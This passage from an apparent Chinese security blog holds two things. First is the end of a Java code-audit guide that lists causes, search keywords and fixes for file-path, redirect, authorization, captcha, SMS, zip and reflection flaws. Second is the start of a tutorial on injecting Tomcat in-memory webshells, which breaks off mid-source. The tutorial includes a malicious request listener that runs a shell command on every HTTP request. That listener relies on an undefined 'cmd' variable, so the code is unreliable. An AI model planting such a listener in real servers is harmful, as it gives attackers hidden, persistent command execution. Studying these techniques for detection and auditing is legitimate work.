id="任意文件读-写-删除-复制-移动-遍历"><a href="#任意文件读-写-删除-复制-移动-遍历" class="headerlink" title="任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历"></a>任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历</h4><h5 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>应用程序由于业务需求，提供了文件操作的一系列功能，但文件名、文件路径等由用户控制，在校验不当的情况下，用户可以绕过限制对服务器上任意文件进行操作。</p><h5 id="审计策略-7"><a href="#审计策略-7" class="headerlink" title="审计策略"></a>审计策略</h5><p>首先关注包含这些功能的类和函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.ch</span><span class="hljs-selector-class">.FileChannelImpl</span><br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>.list/listFiles<br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileInputStream</span><br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileOutputStream</span><br>java<span class="hljs-selector-class">.io</span>.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem<br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span>.UnixFileSystemProvider/WindowsFileSystemProvider<br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.RandomAccessFile</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span><span class="hljs-selector-class">.CopyFile</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span><span class="hljs-selector-class">.UnixChannelFactory</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span><span class="hljs-selector-class">.WindowsChannelFactory</span><br>java<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.channels</span><span class="hljs-selector-class">.AsynchronousFileChannel</span><br>FileUtil/IOUtil<br>filePath/download/deleteFile/move/getFile<br></code></pre></td></tr></table></figure><p>在使用这些函数时，对于用户传递来的文件对象&#x2F;文件名&#x2F;文件路径，是否进行了正确的处理：</p><ul><li>是否限制了可操作文件的路径、文件类型、文件所有者。</li><li>是否将敏感文件进行排除。</li><li>查找<code>getPath()</code>, <code>getAbsolutePath()</code>，查看是否有错误的路径判断。</li></ul><p>再排查程序的安全策略配置文件，全局搜索<code>permission</code>、<code>Java.io.FilePermission</code>、<code>grant</code>字样。查看是否只为程序的某部分路径赋予读写权限。</p><h5 id="如何修复-7"><a href="#如何修复-7" class="headerlink" title="如何修复"></a>如何修复</h5><ul><li>对要操作的文件名进行黑白名单限制。</li><li>对用户输入的数据进行过滤，过滤掉”.&#x2F;“、”…&#x2F;“、”%”、”&#x2F;“</li><li>针对不同的功能，将可操作文件路径限制在某个目录内，禁止攻击者通过 ‘..&#x2F;‘的方式穿越路径，建议使用<code>getCanonicalPath()</code>标准化路径，之后再进行限制和判断。</li><li>使用 FilePermission 限制权限。</li></ul><h4 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h4><h5 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>由于Web站点有时需要根据不同的逻辑将用户引向到不同的页面，如典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致URL重定向问题，攻击者构造恶意跳转的链接，可以向用户发起钓鱼攻击。</p><h5 id="审计策略-8"><a href="#审计策略-8" class="headerlink" title="审计策略"></a>审计策略</h5><p>出现URL重定向主要的功能有：</p><ul><li>用户登录、统一身份认证处，认证完了会通过url&#x3D;的形式跳转到类似操作的页面。</li><li>用户分享、收藏内容后跳转。</li><li>跨域认证授权后进行跳转。</li></ul><p>一些相关函数及关键字：<code>sendRedirect</code>、<code>setHeader</code>、<code>forward</code>、<code>redirect:</code>、<code>&lt;c:redirect</code>、<code>self.location.href</code>、<code>location.href</code>、<code>windows.location.href</code>等。<br>一些常见的参数名称：<code>redirect</code>、<code>redirect_do</code>、<code>redirect_url</code>、<code>url</code>、<code>jump</code>、<code>jump_to</code>、<code>target</code>、<code>to</code>、<code>link</code>、<code>domain</code>等。</p><p>审计的思路为定位可能存在redirect业务的代码段，审计跳转的URL是否来自于前端参数，是否具有校验和限制。</p><h5 id="如何修复-8"><a href="#如何修复-8" class="headerlink" title="如何修复"></a>如何修复</h5><p>对传入的URL做认证处理，保证该URL来自于信任域。例如如下方式：</p><ul><li>通过限制Referer保证将要跳转URL的有效性，避免攻击者生成自己的恶意跳转链接。</li><li>加入有效性验证Token，保证所有生成的链接都来自于可信域，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验。</li></ul><p>关键参数前端不可控。<br>对跳转的URL进行白名单检查</p><h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3><h4 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h4><h5 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>在应用程序处理当前用户请求时，没有对用户权限进行校验，或校验不足、失效，导致低权限用户使用高权限功能，或同权限用户操作对方数据。</li><li>对用户的身份标识信息从可伪造的参数或headers中获取，而不是从session中获取的话，可能存在越权。</li><li>一些跨域的服务导向架构，尤其是一些数据处理的接口，如果缺少类似token的认证机制的话，也会存在类似的越权访问问题。</li></ul><h5 id="审计策略-9"><a href="#审计策略-9" class="headerlink" title="审计策略"></a>审计策略</h5><p>针对系统任意功能都可能存在越权，审计关注的是:</p><ul><li>操作是否需要身份标识或其他标识。</li><li>此标识是否由用户可控。</li><li>是否能够可猜解，不同主体的标识是否具有规律性。</li><li>查询信息场景下，信息是否与身份标识进行绑定。</li><li>对应处理的函数方法中是否使用注解或其他方式对当前用户进行权限校验。</li><li>校验能否被绕过或失效。</li></ul><h5 id="如何修复-9"><a href="#如何修复-9" class="headerlink" title="如何修复"></a>如何修复</h5><ul><li>处理请求之前先进行权限校验，可通过Filter、AOP或拦截器进行实现。</li><li>用户标识从缓存中取出，尽量不从参数中取。</li></ul><h4 id="图形验证码漏洞"><a href="#图形验证码漏洞" class="headerlink" title="图形验证码漏洞"></a>图形验证码漏洞</h4><h5 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>当验证码图片的长宽由前端参数控制，并且后端没有进行校验时，攻击者可以并发生成超大的图片来进行DDOS攻击。</li><li>当验证码认证了一次后，无论成功还是失败，没有及时清空，就可以被重复使用，导致爆破攻击。</li><li>简单的图片验证码可被OCR识别，导致爆破攻击。</li><li>在后端逻辑校验过程中并未对前端传递验证码参数为null进行相关的逻辑判断，直接删除验证码参数或置空值即可绕过。</li></ul><h5 id="审计策略-10"><a href="#审计策略-10" class="headerlink" title="审计策略"></a>审计策略</h5><p>在登陆，重要数据的增删改功能处一般会添加图形验证码功能，可以通关关键字搜索：<code>captcha</code>、<code>checkCode</code>等等。<br>重点审计验证码生成逻辑，以及验证码的判断校验逻辑、顺序。</p><h5 id="如何修复-10"><a href="#如何修复-10" class="headerlink" title="如何修复"></a>如何修复</h5><p>图形验证码由后端控制大小；验证一次后无论是否成功都立即清空缓存；生成复杂的图形验证码，降低遭到机器识别的风险；对验证码参数是否为空进行判断。</p><h4 id="短信服务漏洞"><a href="#短信服务漏洞" class="headerlink" title="短信服务漏洞"></a>短信服务漏洞</h4><h5 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>如果应用程序对短信接口没有发送频率限制、或校验逻辑有误，则会导致短信炸弹漏洞。</li><li>如果对手机号进行校验或格式化处理逻辑有误，可导致攻击者通过使用空格、分隔符、手机区号、字母等方式绕过对手机号的限制，在进行缓存计数时进行绕过。</li><li>如果短信内容的提示有部分通过参数内容获取，则可能导致攻击者篡改消息内容，对部分用户进行定点钓鱼攻击、或垃圾短信等。</li></ul><h5 id="审计策略-11"><a href="#审计策略-11" class="headerlink" title="审计策略"></a>审计策略</h5><p>重点审计发送短信验证码功能的业务逻辑，一般通过关键字<code>sms</code>进行搜索。审计业务逻辑、缓存次数逻辑、非空判断逻辑、短信内容逻辑等等。</p><h5 id="如何修复-11"><a href="#如何修复-11" class="headerlink" title="如何修复"></a>如何修复</h5><p>针对手机号的格式化以及号码缓存的业务逻辑设计一定要正确，对短信发送接口及验证接口的业务顺序要正确。</p><h4 id="Zip文件提取"><a href="#Zip文件提取" class="headerlink" title="Zip文件提取"></a>Zip文件提取</h4><h5 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>在业务中可能存在上传压缩文件并提取的功能，利用此类功能可能存在如下安全问题：</p><ul><li>如果提取出的文件标准路径落在解压的目标目录之外，攻击者可以利用此功能进行任意文件写入。</li><li>提取出的文件消耗过多的系统资源。zip算法的本性就可能会导致zip炸弹（zip bomb）的出现，<br>由于极高的压缩率，即使在解压小文件时，比如ZIP、GIF，以及gzip编码的HTTP内容，也<br>可能会导致过度的资源消耗。</li></ul><h5 id="审计策略-12"><a href="#审计策略-12" class="headerlink" title="审计策略"></a>审计策略</h5><p>审计重点主要关注应用是否存在ZIP解压缩功能：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">FileInputStream<br>ZipInputStream<br><span class="hljs-function"><span class="hljs-title">getSize</span><span class="hljs-params">()</span></span><br>ZipEntry<br></code></pre></td></tr></table></figure><p>如果出现getSize基本上就需要特别注意了。</p><h5 id="如何修复-12"><a href="#如何修复-12" class="headerlink" title="如何修复"></a>如何修复</h5><p>针对ZIP解压缩功能，应该在解压每个条目之前对其文件名进行校验。如果校验不通过，就终止整个解压过程，或对其进行忽略。<br>除了校验文件名，还应该对每个文件大小进行限制，过大的单个文件应该不予处理，或抛出异常。<br>最后对文件总个数也应该有所限制，避免过多的文件数目导致占用系统资源。</p><h4 id="自动绑定漏洞"><a href="#自动绑定漏洞" class="headerlink" title="自动绑定漏洞"></a>自动绑定漏洞</h4><h5 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>攻击者可能将非预期的HTTP请求参数绑定到一个对象上，使用这种方法来创建、修改、更新开发人员或者业务本身从未打算变更的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象，进而触发一些业务逻辑漏洞。</p><h5 id="审计策略-13"><a href="#审计策略-13" class="headerlink" title="审计策略"></a>审计策略</h5><p>重点审计应用程序接参时是否使用自动绑定注入完整对象，而对象是否又对应了数据层的实体类，在更新数据时是否能够通过添加参数的方式更新非预期的属性值；或这些参数能否影响后续业务逻辑。</p><h5 id="如何修复-13"><a href="#如何修复-13" class="headerlink" title="如何修复"></a>如何修复</h5><p>取原始数据由DAO层取；存放于session中的对象，如用户等，在更新信息时注意敏感字段；使用自动绑定以实体类来接参时，确保类属性与实际参数能够一一对应。</p><h4 id="其他业务逻辑漏洞"><a href="#其他业务逻辑漏洞" class="headerlink" title="其他业务逻辑漏洞"></a>其他业务逻辑漏洞</h4><h5 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>在代码中可能存在各种业务逻辑类的漏洞，要具体看开发人员实现的代码逻辑。在实现有误的情况下，如校验不完全、校验顺序错误、校验逻辑设计错误等，将会产生各种业务逻辑漏洞。</p><h5 id="审计策略-14"><a href="#审计策略-14" class="headerlink" title="审计策略"></a>审计策略</h5><p>最常见的就是任意密码重置、验证码绕过等等，下面简单列举了一些。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>. 用户登陆、用户注册、找回密码等功能中密码信息未采用加密算法。<br><span class="hljs-number">2</span>. 用户登陆、用户注册、找回密码等功能中`未采用验证码`或`验证码未做安全刷新`(未刷新Session中验证码的值)导致的撞库、密码爆破漏洞。<br><span class="hljs-number">3</span>. 找回密码逻辑问题(如:可直接跳过验证逻辑直接发包修改)。<br><span class="hljs-number">4</span>. 手机、邮箱验证、找回密码等涉及到动态验证码`未限制验证码失败次数`、`验证码有效期`、`验证码长度过短`导致的验证码爆破问题。<br><span class="hljs-number">5</span>. 充值、付款等功能调用了第三方支付系统未正确校验接口(与第三方的交互、与客户的交互，主要查看逻辑问题)。<br><span class="hljs-number">6</span>. 后端采用了`ORM框架`更新操作时因处理不当导致可以更新用户表任意字段(如:用户注册、用户个人资料修改时可以`直接创建管理员账号`或其他越权修改操作)。<br><span class="hljs-number">7</span>. 后端采用了`ORM框架`查询数据时因处理不当导致可以接收任何参数导致的越权查询、敏感信息查询等安全问题。<br><span class="hljs-number">8</span>. 用户中心转账、修改个人资料、密码、退出登陆等功能未采用验证码或`Token机制`导致存在`CSRF漏洞`。<br><span class="hljs-number">9</span>. 后端服务过于信任前端，重要的参数和业务逻辑只做了前端验证(如:文件上传功能的文件类型只在JS中验证、后端不从Session中获取用户ID、用户名而是直接接收客户端请求的参数导致的`越权问题`)。<br><span class="hljs-number">10</span>. 用户身份信息认证逻辑问题(如:后台系统自动登陆时直接读取Cookie中的用户名、用户权限不做验证)。<br><span class="hljs-number">11</span>. 重要接口采用`ID自增、ID可预测并且云端未验证参数有效性`导致的越权访问、信息泄漏问题(如:任意用户订单越权访问)。<br><span class="hljs-number">12</span>. `条件竞争问题`，某些关键业务(如:用户转账)不支持并发、分布式部署时不支持锁的操作等。<br><span class="hljs-number">13</span>. 重要接口`未限制请求频率`，导致短信、邮件、电话、私信等信息轰炸。<br><span class="hljs-number">14</span>. 敏感信息未保护，如`Cookie中直接存储用户密码等重要信息`，跟踪cookie中的变量最终到了哪。<br><span class="hljs-number">15</span>. 弱加密算法、弱密钥，如勿把Base64当成数据加密方式、重要算法密钥采用弱口令如`123456`。<br><span class="hljs-number">16</span>. 后端无异常处理机制、未自定义<span class="hljs-number">50</span>X错误页面,服务器异常导致敏感信息泄漏(如:数据库信息、网站绝对路径等)。<br><span class="hljs-number">17</span>. 使用`DWR框架`开发时前后端不分漏洞(如:DWR直接调用数据库信息把用户登陆逻辑直接放到了前端来做)。<br></code></pre></td></tr></table></figure><h5 id="如何修复-14"><a href="#如何修复-14" class="headerlink" title="如何修复"></a>如何修复</h5><p>在业务逻辑实现时详细设计，代码实现时注意一些常见的坑，避免出现以上提到的漏洞。</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><h4 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h4><h5 id="漏洞成因-15"><a href="#漏洞成因-15" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>如果将敏感信息（包括口令和加密密钥）硬编码在程序中，可能会将敏感信息暴露给攻击者。任何能够访问到class文件的人都可以反编译class文件并发现这些敏感信息。因此，不能将信息硬编码在程序中。</p><h5 id="审计策略-15"><a href="#审计策略-15" class="headerlink" title="审计策略"></a>审计策略</h5><p>审计源代码中是否有硬编码敏感信息。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">password</span><br><span class="hljs-attribute">pass</span><br><span class="hljs-attribute">jdbc</span><br><span class="hljs-attribute">auth</span><br></code></pre></td></tr></table></figure><h5 id="如何修复-15"><a href="#如何修复-15" class="headerlink" title="如何修复"></a>如何修复</h5><p>动态获取敏感信息，通过配置文件、读取数据库或其他手段。</p><h4 id="临时文件删除"><a href="#临时文件删除" class="headerlink" title="临时文件删除"></a>临时文件删除</h4><h5 id="漏洞成因-16"><a href="#漏洞成因-16" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>开发人员会在全局可写的目录中创建临时文件。这类目录中的文件可能会被定期清理，然而，如果文件未被安全地创建或者用完后还是可访问的，攻击者便可以利用共享目录中的文件操作获取本地文件系统访问权限。</p><h5 id="审计策略-16"><a href="#审计策略-16" class="headerlink" title="审计策略"></a>审计策略</h5><p>重点文件应用程序创建新文件时是否为临时文件，在使用后是否对临时进行及时的删除。<br>可以搜索关键字<code>File</code>、<code>FileOutputStream</code>、<code>tempFile</code>、<code>FileUtils</code>进行查找。</p><h5 id="如何修复-16"><a href="#如何修复-16" class="headerlink" title="如何修复"></a>如何修复</h5><p>可以使用NIO中的<code>createTempFile()</code> 方法创建临时文件，这种方法无论是否有异常，都会自动关闭文件，使用<code>DELETE_ON_CLOSE</code>选项，在文件关闭时自动删除。<br>或在业务逻辑处理完成后显式地进行删除，但要注意条件竞争问题。</p><h4 id="不安全的反射"><a href="#不安全的反射" class="headerlink" title="不安全的反射"></a>不安全的反射</h4><h5 id="漏洞成因-17"><a href="#漏洞成因-17" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>开发人员如果提供了接口，可以由访问人员为应用程序提供确定实例化哪个类或调用哪个方法的参数值，那么就有可能创建一个贯穿于整个应用程序的控制流路径，而该路径并非是应用程序开发者最初设计的。</p><p>而攻击者可以利用这样的接口调用非预期的任意方法执行文件写入、命令执行或者其他的恶意操作。</p><h5 id="审计策略-17"><a href="#审计策略-17" class="headerlink" title="审计策略"></a>审计策略</h5><p>查看开发人员是否对反射调用方法、反射创建类实例进行了封装，并是否在对外的接口中进行了相关的调用。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span>.forName<br><span class="hljs-keyword">Method</span>.invoke<br>newInstance<br>Worker/<span class="hljs-keyword">Invoker</span><br></code></pre></td></tr></table></figure><h5 id="如何修复-17"><a href="#如何修复-17" class="headerlink" title="如何修复"></a>如何修复</h5><p>避免对外开放具有相关功能的接口，或在调用前进行严格的审查。</p><h4 id="使用了不安全的组件"><a href="#使用了不安全的组件" class="headerlink" title="使用了不安全的组件"></a>使用了不安全的组件</h4><h5 id="漏洞成因-18"><a href="#漏洞成因-18" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>开发人员在开发应用程序时可能会引用第三方的组件，这些组件可能被报出过安全漏洞，但是使用者由于种种原因没有及时升级，因此可能导致存在历史遗留的问题。</p><p>组件例如 fastjson、jackson、xstream，框架例如 struts2、spring 等等，都要注意使用的版本问题。</p><h5 id="审计策略-18"><a href="#审计策略-18" class="headerlink" title="审计策略"></a>审计策略</h5><p>关注 maven 和 gradle 等包管理软件处理的应用程序依赖，关注开发人员所使用的应用程序版本，查看是否具有存在漏洞的版本，并查看其具体调用位置，看是否能够组合成相关漏洞。</p><p>必要时可借助 SCA 审查工具来实现。</p><h5 id="如何修复-18"><a href="#如何修复-18" class="headerlink" title="如何修复"></a>如何修复</h5><p>确保应用程序使用较新的、或安装了安全补丁的组件。</p><h2 id="思路准备"><a href="#思路准备" class="headerlink" title="思路准备"></a>思路准备</h2><p>以下仅为个人学习观点，如有不对或者需要补充还请师傅们斧正。</p><h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>其实学完这些东西之后，实际你大概率还是不能自己审计的。但是此时的你已经对Java审计有了进一步的认识。这个时候你可以自己搭建一些之前的热门环境漏洞比如 Struts2、Shiro、Fastjson、或者网上有一些新的热门漏洞可以跟着文章进行复现分析。一定多做，即可以帮助自己深刻理解之前学习到的概念，还能多了解新的漏洞点。</p><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>多接触热门框架漏洞。熟悉主流框架的结构，到时候会有自己审计的侧重点和关注点。然后自己找一些小众的项目自己进行代码审计。</p><h3 id="高阶"><a href="#高阶" class="headerlink" title="高阶"></a>高阶</h3><p>高阶我不了解，因为自己还是太菜了。但是安全的尽头是开发。我估计也离不开开发。。。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>深入（鸡肋马）内存马</title>
    <link href="/2023/12/04/%E6%B7%B1%E5%85%A5(%E9%B8%A1%E8%82%8B%E9%A9%AC)%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2023/12/04/%E6%B7%B1%E5%85%A5(%E9%B8%A1%E8%82%8B%E9%A9%AC)%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="深入-鸡肋马-内存马"><a href="#深入-鸡肋马-内存马" class="headerlink" title="深入(鸡肋马)内存马"></a>深入(鸡肋马)内存马</h1><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;<br>            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">9.0</span><span class="hljs-number">.55</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>很明显，<code>ServletRequestListener</code>是最适合用来作为内存马的。因为<code>ServletRequestListener</code>是用来监听<code>ServletRequest</code>对象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebListener;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问任意路由都可执行命令</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-5.png" alt="img1"></p><p>下面的问题就是如何将恶意的Listener动态注册进服务器了，下面我们来分析一下Listener的创建过程。</p><h4 id="Listener的创建过程"><a href="#Listener的创建过程" class="headerlink" title="Listener的创建过程"></a>Listener的创建过程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Java">requestInitialized:<span class="hljs-number">13</span>, Shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p><code>StandardContext#fireRequestInitEvent</code>调用了我们的Listener，我们跟进看其实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br> <br>        Object instances[] = getApplicationEventListeners();<br> <br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br> <br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br> <br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span 